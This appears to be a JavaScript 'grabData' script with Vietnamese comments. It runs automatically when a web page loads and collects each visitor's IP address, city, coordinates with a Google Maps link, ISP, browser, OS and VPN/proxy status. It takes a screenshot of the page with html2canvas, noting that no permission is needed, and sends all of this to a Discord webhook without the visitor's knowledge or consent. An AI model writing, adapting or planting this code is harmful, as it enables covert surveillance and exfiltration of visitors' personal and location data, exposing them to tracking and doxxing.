const grabData = async () => {
    try {
        console.log("Bắt đầu grabData...");

        // Lấy config từ file JSON
        const configResponse = await fetch("./config.json");
        if (!configResponse.ok) {
            throw new Error("Không tải được config.json: " + configResponse.status);
        }
        const config = await configResponse.json();
        const webhookUrl = config.Token;
        const apiKey = config.key;
        console.log("Config OK:", { hasWebhook: !!webhookUrl, hasKey: !!apiKey });

        if (!webhookUrl || !apiKey) {
            throw new Error("Thiếu Token hoặc key trong config.json");
        }

        // Gọi API lấy dữ liệu IP và user-agent
        const geoResponse = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`);
        const userResponse = await fetch(`https://api.ipgeolocation.io/user-agent?apiKey=${apiKey}`);
        if (!geoResponse.ok || !userResponse.ok) {
            throw new Error("Lỗi gọi API: " + geoResponse.status + "/" + userResponse.status);
        }

        const geoData = await geoResponse.json();
        const agentData = await userResponse.json();
        console.log("API data OK");

        // Gọi API security để detect VPN/Proxy
        const securityResponse = await fetch(`https://api.ipgeolocation.io/v2/security?apiKey=${apiKey}&ip=${geoData.ip}`);
        let vpnInfo = "Không rõ";
        let isVPN = false;
        if (securityResponse.ok) {
            const securityData = await securityResponse.json();
            console.log("Security API data OK");
            isVPN = securityData.is_vpn || false;
            if (isVPN) {
                vpnInfo = `Có sử dụng VPN (${securityData.vpn_provider || 'Unknown Provider'})`;
            } else if (securityData.is_proxy) {
                vpnInfo = `Có sử dụng Proxy (${securityData.proxy_type || 'Unknown Type'})`;
            } else {
                vpnInfo = "Không sử dụng VPN/Proxy";
            }
        } else {
            console.warn("Không thể gọi Security API:", securityResponse.status);
            vpnInfo = "Không thể kiểm tra";
        }

        // Hàm helper lấy giá trị an toàn (tránh undefined)
        const safeGet = (obj, path, fallback = "N/A") => {
            return path.split('.').reduce((o, p) => (o && o[p] !== undefined) ? o[p] : fallback, obj);
        };

        // Trích xuất dữ liệu địa lý với fallback
        const ip = geoData.ip || "Unknown";
        const isp = `${safeGet(geoData, 'isp')} (${safeGet(geoData, 'continent_code')})`;
        const country = safeGet(geoData, 'country_name', "Unknown");
        const regionCode = (safeGet(geoData, 'country_code2') || "").toLowerCase();
        const region = `${safeGet(geoData, 'country_code3')} (${safeGet(geoData, 'country_code2')})`;
        const city = safeGet(geoData, 'city', "Unknown");
        const languages = safeGet(geoData, 'languages');
        const lat = safeGet(geoData, 'latitude', 0);
        const lon = safeGet(geoData, 'longitude', 0);
        const callCode = safeGet(geoData, 'calling_code');
        const flag = safeGet(geoData, 'country_flag') || "https://via.placeholder.com/64?text=Flag";
        const currency = safeGet(geoData, 'currency.name');

        // Trích xuất dữ liệu trình duyệt với fallback
        const browserName = `${safeGet(agentData, 'name')}/${safeGet(agentData, 'type')}`;
        const engine = `${safeGet(agentData, 'engine.name')} (${safeGet(agentData, 'engine.versionMajor', '?')})`;
        const os = `${safeGet(agentData, 'operatingSystem.name')} ${safeGet(agentData, 'operatingSystem.versionMajor', '?')}`;

        // Tự load html2canvas từ CDN và chụp screenshot (KHÔNG cần quyền!)
        let screenshotBlob = null;
        let hasScreenshot = false;
        try {
            // Tạo script tag để load html2canvas
            const script = document.createElement('script');
            script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            script.async = true;

            // Chờ script load xong mới chụp
            await new Promise((resolve, reject) => {
                script.onload = async () => {
                    console.log("html2canvas loaded thành công!");
                    try {
                        const canvas = await html2canvas(document.body, {
                            scale: 1,  // Chất lượng (1 = gốc)
                            useCORS: true,  // Hỗ trợ ảnh cross-origin
                            allowTaint: true,  // Cho phép ảnh từ domain khác
                            backgroundColor: '#ffffff'  // Nền trắng nếu cần
                        });
                        canvas.toBlob((blob) => {
                            screenshotBlob = blob;
                            hasScreenshot = true;
                            console.log("Chụp screenshot trang thành công");
                        }, 'image/png');
                        resolve();
                    } catch (captureError) {
                        console.warn("Lỗi chụp screenshot:", captureError);
                        reject(captureError);
                    }
                };
                script.onerror = () => {
                    console.error("Lỗi load html2canvas từ CDN");
                    reject(new Error("Không load được html2canvas"));
                };
                document.head.appendChild(script);
            });
        } catch (screenshotError) {
            console.warn("Không thể chụp screenshot:", screenshotError.message);
            hasScreenshot = false;
        }

        // Tạo payload cơ bản
        const params = {
            username: `Truy cập từ ${country}/${city}`,
            avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
            content: "Log mới! 🌐",
            embeds: [
                {
                    title: `🌐 Địa chỉ IP: ${ip}`,
                    url: `https://whatismyipaddress.com/ip/${ip}`,
                    description: "Log lượt truy cập website",
                    thumbnail: { url: flag },
                    color: isVPN ? 16711680 : 1993898,  // Đỏ nếu dùng VPN, xanh nếu không
                    fields: [
                        {
                            name: "📞 ISP",
                            value: isp,
                            inline: true
                        },
                        {
                            name: `:flag_${regionCode}: Quốc gia & Khu vực`,
                            value: `${country}/${city} - ${region}`,
                            inline: true
                        },
                        {
                            name: "📍 Vị trí",
                            value: `Kinh độ: ${lon}\nVĩ độ: ${lat}\nGoogle Maps: [Click](https://www.google.com/maps/@${lat},${lon},6z)`,
                            inline: true
                        },
                        {
                            name: "👤 Thông tin Client",
                            value: `🌐 Trình duyệt: ${browserName}\n⚙️ Engine: ${engine}\n💻 HĐH: ${os}`,
                            inline: true
                        },
                        {
                            name: "🔒 VPN/Proxy",
                            value: vpnInfo,
                            inline: true
                        },
                        {
                            name: "📧 Thông tin thêm",
                            value: `📞 Mã gọi: (+${callCode})\n🗣️ Ngôn ngữ: ${languages}\n💰 Tiền tệ: ${currency}`,
                            inline: true
                        },
                        {
                            name: "📸 Screenshot",
                            value: hasScreenshot ? "Đã chụp trang web (xem attachment)" : "Không thể chụp",
                            inline: true
                        }
                    ],
                    footer: {
                        text: `Thời gian: ${new Date().toISOString()}`,
                        icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png"
                    }
                }
            ]
        };

        // Gửi lên Discord (FormData nếu có ảnh)
        console.log("Gửi payload...");
        let response;
        if (screenshotBlob) {
            const formData = new FormData();
            formData.append('file', screenshotBlob, 'page-screenshot.png');
            formData.append('payload_json', JSON.stringify(params));
            response = await fetch(webhookUrl, { method: "POST", body: formData });
        } else {
            response = await fetch(webhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(params)
            });
        }

        const errorText = await response.text();
        console.log("Response full:", { status: response.status, body: errorText });

        if (response.ok) {
            console.log("Gửi thành công! 🎉");
        } else {
            console.error("Lỗi gửi chi tiết:", response.status, errorText);
            throw new Error(`HTTP ${response.status}: ${errorText}`);
        }
    } catch (error) {
        console.error("Lỗi trong grabData:", error.message);
    }
};

// Chạy lần đầu
grabData();
